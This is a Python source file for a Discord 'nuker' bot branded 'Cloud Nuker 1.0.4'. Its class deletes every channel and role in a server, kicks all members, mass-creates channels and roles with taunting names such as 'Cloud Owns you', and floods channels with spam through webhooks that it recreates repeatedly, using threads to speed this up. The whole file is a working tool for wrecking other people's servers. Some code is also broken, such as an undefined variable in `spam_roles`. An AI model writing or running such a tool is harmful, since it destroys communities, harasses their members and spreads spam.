import bot_api
from time import sleep
import threading
from random import choice
version = "1.0.4"

class Nuker:
    def __init__(self, api: bot_api.Bot):
        self.api = api
        self.managed_guild = None
        self.managed_channel = None
        self.name = [
"Nuked", 
"By Cloud",
"Cloud Owns you",
"Облако владеет вами",
"雲擁有您",
"Cloud The God",
"Cloud The King",
"No Mercy",
f"Cloud Nuker {version}"
        ]

    def set_guild(self, guild):
        self.managed_guild = guild

    def nuke_channels(self):
        channels = self.api.get_guild_channels(self.managed_guild['id']).json()
        for channel in channels:
            self._create_thread(self.api.delete_channel, (channel['id'],))
        print(f'[+] Deleted all {len(channels) }channels')
    
    def nuke_roles(self):
        roles = self.api.get_roles(self.managed_guild['id']).json()
        for role in roles:
            self._create_thread(self.api.delete_role, (self.managed_guild['id'], role['id']))
        print(f'[+] Deleted all {len(roles) }roles')
    
    def create_channels(self, amount, name=None):
        

        for _ in range(amount):
            if name is None: name = choice(self.name)
            self._create_thread(self.api.create_channel, (self.managed_guild['id'], 0, name))
        print(f'[+] Created {amount} channels')
    
    def create_roles(self, amount, name=None):
        for _ in range(amount):
            if name is None: name = choice(self.name)
            self._create_thread(self.api.create_role, (self.managed_guild['id'], name))
        print(f'[+] Created {amount} roles')
    
   
    
    def spam_roles(self, amount):
        roles = self.api.get_guild_roles(self.managed_guild['id']).json()
        for _ in range(amount):
            #delete all roles
            for role in roles:
                self._create_thread(self.api.delete_role, (self.managed_guild['id'], role['id']))
            #create roles
            for _ in range(amount):
                if name is None: name = choice(self.name)
                self._create_thread(self.api.create_role, (self.managed_guild['id'], name))
    


    def kick_members(self):
        members = self.api.get_guild_members(self.managed_guild['id']).json()
        for member in members:
            self._create_thread(self.api.kick_member, (self.managed_guild['id'], member['user']['id']))
        print(f'[+] Kicked {len(members)} members')
    

        
            
    def _create_thread(self, func, args):
        thread = threading.Thread(target=func, args=args)
        thread.start()
        return thread
    
    def spam_message_using_wb(self, channelid, amount, content):
        #create webhook
        webhook = self.api.create_webhook(channelid, "Cloud Nuker").json()
        try:
            webhook = f"https://discord.com/api/webhooks/{webhook['id']}/{webhook['token']}"
        except KeyError:
            print(webhook)
            sleep(0.5)
            self.spam_message_using_wb(channelid, amount, content)
        if amount > 20:
            for _ in range(amount//20):
                #send 20 message per webhook (max)
                
                for _ in range(20):
                    #send 20 message per webhook (max)
                    self.api.send_message_to_wb(webhook, content)
                self.api.delete_wb(webhook)
                webhook = self.api.create_webhook(channelid, "Cloud Nuker", None).json()
                webhook = f"https://discord.com/api/webhooks/{webhook['id']}/{webhook['token']}"
        else:
            for _ in range(amount):
                #send 20 message per webhook (max)
                self.api.send_message_to_wb(webhook, content)
            self.api.delete_wb(webhook)
                
    def spam_channels(self, amount, content):
        channels = self.api.get_guild_channels(self.managed_guild['id']).json()
        for channel in channels:
            self._create_thread(self.api.spam_channel, (channel['id'], content, amount))
        print(f'[+] Job for {amount} messages in {len(channels)} channels started')